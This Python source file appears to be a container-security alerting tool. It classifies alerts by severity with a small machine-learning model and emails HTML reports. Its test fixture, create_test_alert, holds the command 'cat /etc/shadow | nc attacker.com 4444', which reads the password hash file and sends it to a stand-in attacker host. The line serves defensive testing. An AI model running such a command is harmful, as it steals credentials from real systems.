import os
import json
import smtplib
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import yaml
from dotenv import load_dotenv
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from joblib import dump, load
import numpy as np

# Load environment variables
load_dotenv()

# Configuration
CONFIG = {
    "falco_url": "http://localhost:2801",
    "grafana_url": "http://localhost:3000",
    "prometheus_url": "http://localhost:9090",
    "email_sender": os.getenv("EMAIL_SENDER"),
    "email_password": os.getenv("EMAIL_PASSWORD"),
    "email_recipient": "ritvik.indupuri@gmail.com"
}

class SecurityAlertClassifier:
    def __init__(self):
        self.vectorizer = TfidfVectorizer(max_features=1000)
        self.classifier = RandomForestClassifier(n_estimators=100, random_state=42)
        self.is_trained = False
        self.model_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'security_model.joblib')
        self.load_model()
        
        # Ensure we always have a working model
        if not self.is_trained:
            print("Training initial model with sample data...")
            self._train_with_sample_data()
            if self.is_trained:
                print("Model trained successfully")
            else:
                print("Warning: Could not train model, using fallback analysis")
    
    def train(self, texts, labels):
        """Train the classifier with sample data"""
        try:
            if not texts or not labels or len(texts) != len(labels):
                raise ValueError("Invalid training data")
                
            X = self.vectorizer.fit_transform(texts)
            self.classifier.fit(X, labels)
            self.is_trained = True
            self.save_model()
            return True
        except Exception as e:
            print(f"Training error: {e}")
            self.is_trained = False
            return False
    
    def predict(self, text):
        """Predict the severity of a security alert"""
        if not self.is_trained:
            return self._fallback_predict(text)
        
        try:
            X = self.vectorizer.transform([text])
            prediction = self.classifier.predict_proba(X)[0]
            return self._format_prediction(prediction)
        except Exception as e:
            print(f"Prediction error: {e}")
            return self._fallback_predict(text)
    
    def _format_prediction(self, prediction):
        """Format the prediction into a detailed security analysis"""
        classes = ['low', 'medium', 'high', 'critical']
        confidence_scores = {cls: float(pred) for cls, pred in zip(classes, prediction)}
        severity = classes[np.argmax(prediction)]
        confidence = max(prediction)
        
        # Generate detailed analysis based on severity
        analysis = {
            'severity': severity,
            'confidence': float(confidence),
            'confidence_breakdown': confidence_scores,
            'analysis': self._generate_analysis(severity, confidence_scores),
            'indicators': self._get_indicators(severity),
            'mitigation': self._get_mitigation_steps(severity)
        }
        
        return analysis
        
    def _generate_analysis(self, severity, confidence_scores):
        """Generate detailed analysis based on confidence scores"""
        analysis = [
            f"🔍 **Threat Analysis** (Confidence: {max(confidence_scores.values())*100:.1f}%)",
            "",
            "### Confidence Breakdown:",
            "```",
            f"Critical: {confidence_scores['critical']*100:.1f}%",
            f"High:     {confidence_scores['high']*100:.1f}%",
            f"Medium:   {confidence_scores['medium']*100:.1f}%",
            f"Low:      {confidence_scores['low']*100:.1f}%",
            "```",
            "",
            "### Model Insights:",
            "- Confidence score represents the model's certainty in the classification"
        ]
        
        # Add severity-specific analysis
        if severity == 'critical':
            analysis.extend([
                "- Multiple high-confidence indicators of compromise detected",
                "- Immediate action required to prevent system compromise"
            ])
        elif severity == 'high':
            analysis.extend([
                "- Strong indicators of suspicious activity",
                "- Investigation recommended within the hour"
            ])
            
        return "\n".join(analysis)
        
    def _get_indicators(self, severity):
        """Get relevant threat indicators based on severity"""
        indicators = {
            'critical': [
                "Privilege escalation detected",
                "Container escape attempt",
                "Sensitive file access (/etc/shadow, /etc/passwd)",
                "Suspicious network connections"
            ],
            'high': [
                "Unusual process execution",
                "Suspicious command patterns",
                "Abnormal container behavior"
            ],
            'medium': [
                "Unusual login patterns",
                "Suspicious file modifications"
            ],
            'low': [
                "Potential security misconfiguration",
                "Informational alerts"
            ]
        }
        return indicators.get(severity, [])
        
    def _get_mitigation_steps(self, severity):
        """Get recommended mitigation steps based on severity"""
        steps = {
            'critical': [
                "🚨 Isolate affected systems immediately",
                "🔒 Terminate suspicious processes/containers",
                "📋 Preserve logs and artifacts for forensic analysis",
                "🔍 Begin incident response procedures",
                "📞 Notify security team and management"
            ],
            'high': [
                "🔒 Restrict network access to affected systems",
                "📋 Document all findings",
                "🔍 Investigate root cause",
                "📞 Escalate to security team"
            ],
            'medium': [
                "🔍 Investigate during business hours",
                "📋 Add to security review queue",
                "⚙️ Consider rule tuning"
            ],
            'low': [
                "📋 Log for future reference",
                "🔍 Review during next security audit"
            ]
        }
        return steps.get(severity, [])
    
    def _fallback_predict(self, text):
        """Fallback prediction when model is not trained or fails"""
        text = text.lower()
        if any(word in text for word in ['critical', 'emergency', 'attack', 'breach']):
            severity = 'critical'
        elif any(word in text for word in ['high', 'severe', 'suspicious', 'malware']):
            severity = 'high'
        elif any(word in text for word in ['medium', 'warning', 'unusual']):
            severity = 'medium'
        else:
            severity = 'low'
            
        return {
            'severity': severity,
            'confidence': 0.7,
            'analysis': f"Fallback analysis: Detected as {severity} severity"
        }
    
    def save_model(self, model_path=None):
        """Save the trained model to disk"""
        if model_path is None:
            model_path = self.model_path
            
        try:
            model_data = {
                'vectorizer': self.vectorizer,
                'classifier': self.classifier,
                'is_trained': self.is_trained
            }
            # Save to a temporary file first, then rename (atomic operation)
            temp_path = f"{model_path}.tmp"
            dump(model_data, temp_path)
            
            # On Windows, we need to remove the destination file first if it exists
            if os.path.exists(model_path):
                os.remove(model_path)
            os.rename(temp_path, model_path)
            return True
        except Exception as e:
            print(f"Error saving model: {e}")
            return False
    
    def load_model(self, model_path=None):
        """Load a trained model from disk"""
        if model_path is None:
            model_path = self.model_path
            
        try:
            if os.path.exists(model_path):
                model_data = load(model_path)
                self.vectorizer = model_data['vectorizer']
                self.classifier = model_data['classifier']
                self.is_trained = model_data.get('is_trained', False)
                print("Loaded pre-trained security model")
                return True
            else:
                print("No pre-trained model found at", model_path)
                self.is_trained = False
                return False
        except Exception as e:
            print(f"Error loading model from {model_path}: {e}")
            self.is_trained = False
            return False
            
    def _train_with_sample_data(self):
        """Train the model with sample data if no model exists"""
        sample_texts = [
            "Critical security breach detected in the system",
            "Unauthorized access attempt from suspicious IP",
            "Container escape attempt detected",
            "Privilege escalation attempt in container",
            "Suspicious process execution in container",
            "High CPU usage detected on server",
            "New login from unknown device",
            "System update available",
            "Regular backup completed successfully",
            "Network scan detected from 192.168.1.100",
            "Container started with privileged mode",
            "Sensitive file access detected",
            "Failed login attempt for user admin",
            "Port scan detected",
            "Malware signature detected in file"
        ]
        sample_labels = [
            'critical', 'high', 'critical', 'high', 'high',
            'medium', 'medium', 'low', 'low', 'high',
            'high', 'high', 'medium', 'medium', 'critical'
        ]
        return self.train(sample_texts, sample_labels)

# Initialize the classifier
classifier = SecurityAlertClassifier()

# Train with some sample data if not already trained
if not classifier.is_trained:
    sample_texts = [
        "Critical security breach detected in the system",
        "Unauthorized access attempt from suspicious IP",
        "High CPU usage detected on server",
        "New login from unknown device",
        "System update available",
        "Regular backup completed successfully"
    ]
    sample_labels = [
        'critical', 'high', 'medium', 'medium', 'low', 'low'
    ]
    classifier.train(sample_texts, sample_labels)

class AISecurityAutomation:
    def __init__(self):
        self.known_incidents = set()
        self.load_rules()

    def load_rules(self):
        try:
            with open('security_rules.yaml', 'r') as f:
                self.rules = yaml.safe_load(f) or {}
        except FileNotFoundError:
            self.rules = {"rules": [], "whitelist": []}
            self.save_rules()

    def save_rules(self):
        with open('security_rules.yaml', 'w') as f:
            yaml.dump(self.rules, f)

    def analyze_incident(self, alert):
        """Analyze the security alert using our ML model"""
        try:
            # Convert alert to text for analysis
            alert_text = json.dumps(alert, ensure_ascii=False)[:3000]
            
            # Get prediction from our model
            prediction = classifier.predict(alert_text)
            
            # Format the response
            return (
                f"1. Severity: {prediction['severity']}\n"
                f"2. Analysis: {prediction['analysis']}\n"
                "3. Recommended actions: "
                f"{self._get_recommended_actions(prediction['severity'])}"
            )
            
        except Exception as e:
            print(f"Error in analysis: {e}")
            return "\n1. Severity: unknown\n2. Analysis: Error analyzing alert\n3. Recommended actions: Review manually"
    
    def _get_recommended_actions(self, severity):
        """Get recommended actions based on severity"""
        actions = {
            'critical': 'Immediate action required. Isolate affected systems and begin incident response.',
            'high': 'Investigate immediately. Consider isolating affected systems.',
            'medium': 'Review and investigate during business hours.',
            'low': 'Monitor and review during next maintenance window.'
        }
        return actions.get(severity.lower(), 'Review the alert details.')

    def send_alert_email(self, alert, analysis):
        """Send a detailed email alert with incident details and analysis"""
        try:
            msg = MIMEMultipart()
            msg['From'] = CONFIG["email_sender"]
            msg['To'] = CONFIG["email_recipient"]
            
            # Format subject with severity
            severity = analysis.get('severity', 'unknown').upper()
            msg['Subject'] = f"[{severity}] Security Alert: {alert.get('rule', 'Unknown Threat')}"
            
            # Format indicators as HTML list
            indicators_html = ""
            if 'indicators' in analysis and analysis['indicators']:
                indicators_html = "<h4>🚩 Key Indicators:</h4><ul>" + "".join(
                    f"<li>{indicator}</li>" for indicator in analysis['indicators']
                ) + "</ul>"
            
            # Format mitigation steps as HTML list
            mitigation_html = ""
            if 'mitigation' in analysis and analysis['mitigation']:
                mitigation_html = "<h4>🔧 Recommended Actions:</h4><ol>" + "".join(
                    f"<li>{step}</li>" for step in analysis['mitigation']
                ) + "</ol>"
            
            # Format alert details with syntax highlighting
            alert_details = json.dumps(alert, indent=2, ensure_ascii=False)
            
            # Build the email body
            body = f"""
            <html>
                <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
                    <div style="max-width: 800px; margin: 0 auto; padding: 20px; border: 1px solid #e1e1e1; border-radius: 5px;">
                        <h2 style="color: #d32f2f;">🚨 Security Alert Detected</h2>
                        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px;">
                            <p><strong>⏰ Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                            <p><strong>🔒 Rule:</strong> {alert.get('rule', 'N/A')}</p>
                            <p><strong>⚠️ Severity:</strong> <span style="color: {'#d32f2f' if severity == 'CRITICAL' else '#ff9800' if severity == 'HIGH' else '#ffc107'}">{severity}</span></p>
                            <p><strong>📊 Confidence:</strong> {analysis.get('confidence', 0)*100:.1f}%</p>
                            <p><strong>🌐 Source IP:</strong> {alert.get('source_ip', 'N/A')}</p>
                            <p><strong>📦 Container:</strong> {alert.get('container_name', 'N/A')} ({alert.get('container_id', 'N/A')})</p>
                        </div>
                        
                        <h3>🔍 AI Analysis</h3>
                        <div style="background-color: #e8f5e9; padding: 15px; border-radius: 5px; margin-bottom: 20px; white-space: pre-wrap; font-family: monospace;">
                            {analysis.get('analysis', 'No analysis available').replace('\n', '<br>')}
                        </div>
                        
                        {indicators_html}
                        {mitigation_html}
                        
                        <h3>📋 Alert Details</h3>
                        <div style="background-color: #f5f5f5; padding: 15px; border-radius: 5px; overflow-x: auto;">
                            <pre style="margin: 0; white-space: pre-wrap;">{alert_details}</pre>
                        </div>
                        
                        <div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid #eee; font-size: 0.9em; color: #666;">
                            <p>This is an automated alert. Please investigate promptly.</p>
                        </div>
                    </div>
                </body>
            </html>
            """
            
            msg.attach(MIMEText(body, 'html'))
            
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(CONFIG["email_sender"], CONFIG["email_password"])
                server.send_message(msg)
                print(f"✅ Alert email sent to {CONFIG['email_recipient']}")
                
        except Exception as e:
            print(f"❌ Error sending email: {e}")

    def process_alert(self, alert):
        """Process a new security alert"""
        alert_id = alert.get('id')
        if not alert_id or alert_id in self.known_incidents:
            return
            
        self.known_incidents.add(alert_id)
        analysis = self.analyze_incident(alert)
        self.send_alert_email(alert, analysis)
        self.learn_from_incident(alert, analysis)

    def learn_from_incident(self, alert, analysis):
        """Update rules based on new incident"""
        rule = alert.get('rule')
        if rule and rule not in self.rules["rules"]:
            self.rules["rules"].append(rule)
            self.save_rules()

def create_test_alert():
    """Create a test alert that simulates a container escape attack"""
    return {
        "id": f"attack_{int(datetime.now().timestamp())}",
        "rule": "Container escape attempt detected",
        "priority": "critical",
        "source_ip": "10.0.0.5",
        "container_id": "a1b2c3d4e5f6",
        "container_name": "vulnerable-container",
        "image": "vulnerable-app:latest",
        "timestamp": datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
        "details": {
            "process": {
                "name": "bash",
                "pid": 1234,
                "exe": "/bin/bash",
                "args": ["-c", "cat /etc/shadow | nc attacker.com 4444"]
            },
            "user": {
                "name": "root",
                "uid": 0,
                "gid": 0
            },
            "file": {
                "path": "/etc/shadow",
                "operation": "read"
            },
            "container": {
                "privileged": True,
                "capabilities": ["ALL"],
                "mounts": [
                    {
                        "source": "/",
                        "destination": "/host",
                        "type": "bind"
                    }
                ]
            },
            "network": {
                "destination": {
                    "ip": "attacker.com",
                    "port": 4444,
                    "protocol": "tcp"
                }
            },
            "tags": ["container_escape", "privilege_escalation", "data_exfiltration"]
        },
        "message": "Container escape attempt detected: Process 'bash' with PID 1234 attempted to read sensitive file /etc/shadow and exfiltrate data to attacker.com"
    }

def main():
    # Initialize the automation
    automation = AISecurityAutomation()
    
    # Process a test alert
    test_alert = create_test_alert()
    automation.process_alert(test_alert)
    print("Test alert processed. Check your email!")

if __name__ == "__main__":
    main()
